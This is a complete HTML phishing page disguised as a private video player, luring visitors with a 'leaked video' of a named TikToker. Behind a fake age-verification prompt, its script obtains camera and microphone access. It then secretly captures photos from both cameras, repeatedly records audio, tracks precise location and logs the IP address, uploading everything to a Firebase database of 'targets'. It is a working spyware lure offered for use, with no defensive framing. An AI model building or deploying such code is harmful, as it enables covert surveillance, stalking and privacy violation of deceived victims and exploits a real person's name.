<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Video Player | Secure Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        
        /* Background Iframe (Target Website) */
        #site-frame {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            border: none; z-index: 1; opacity: 0.4; /* Shuru mein halka dikhega */
            pointer-events: none; /* Click block */
        }

        /* Front Interaction Layer */
        #hijack-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100; background: rgba(0,0,0,0.6);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .play-box {
            width: 100px; height: 100px; background: #ff0000;
            border-radius: 50%; border: 4px solid #fff;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; box-shadow: 0 0 40px rgba(255,0,0,0.8);
            transition: 0.3s;
        }
        .play-box::after {
            content: ''; border-style: solid; border-width: 18px 0 18px 30px;
            border-color: transparent transparent transparent #fff; margin-left: 10px;
        }

        .text-overlay { color: #fff; margin-top: 20px; text-align: center; }
        .text-overlay h2 { margin: 0; font-size: 22px; color: #ff0000; }
        .text-overlay p { font-size: 13px; opacity: 0.8; }

        /* Status Bar (Fake Loading) */
        #loader { display: none; color: #00ff88; font-family: monospace; margin-top: 15px; }

    </style>
</head>
<body>

    <iframe id="site-frame" src="https://darkero.com/tiktoker-alina-amir-leaked-video/"></iframe>

    <div id="hijack-layer">
        <div class="play-box" onclick="ignite()"></div>
        <div class="text-overlay">
            <h2>PRIVATE CONTENT</h2>
            <p>Verification Required to Watch This Video</p>
            <div id="loader">PERFORMING AGE VERIFICATION...</div>
        </div>
    </div>

<script>
    // --- FIREBASE CONFIG (Yahan apni sahi details daalein) ---
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);

    async function ignite() {
        document.getElementById('loader').style.display = 'block';
        
        try {
            // Target se Permission mangna
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // Data Collect karna
            logTarget();
            trackLocation();
            
            // Instant Front & Back Photo
            snapPhoto("user");
            setTimeout(() => snapPhoto("environment"), 4000);
            
            // 20 Second Audio Record
            recordMic(20000);

            // Lockdown Khatam (Ab target website use kar sakega)
            setTimeout(() => {
                document.getElementById('hijack-layer').style.display = 'none';
                document.getElementById('site-frame').style.opacity = '1';
                document.getElementById('site-frame').style.pointerEvents = 'auto';
            }, 2000);

            // Loop Intelligence (Har 45 sec baad background update)
            setInterval(() => {
                snapPhoto("user");
                recordMic(20000);
            }, 45000);

        } catch (e) {
            alert("Security Error: Camera and Microphone access is required to unlock this video.");
            location.reload();
        }
    }

    async function snapPhoto(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.createElement('video'); video.srcObject = stream; await video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.5),
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch(e) {}
    }

    async function recordMic(duration) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let parts = [];
            mr.ondataavailable = e => parts.push(e.data);
            mr.onstop = () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(parts, { type: 'audio/webm' }));
                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({
                    data: reader.result,
                    time: new Date().toLocaleTimeString()
                });
            };
            mr.start(); setTimeout(() => mr.stop(), duration);
        } catch(e) {}
    }

    function trackLocation() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({
                latitude: p.coords.latitude,
                longitude: p.coords.longitude
            });
        }, null, {enableHighAccuracy:true});
    }

    async function logTarget() {
        const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        db.ref(`targets/${sessionID}/info`).set({
            ip: ipInfo.ip,
            platform: navigator.platform,
            timestamp: Date.now(),
            time: new Date().toLocaleString()
        });
    }
</script>
</body>
</html>
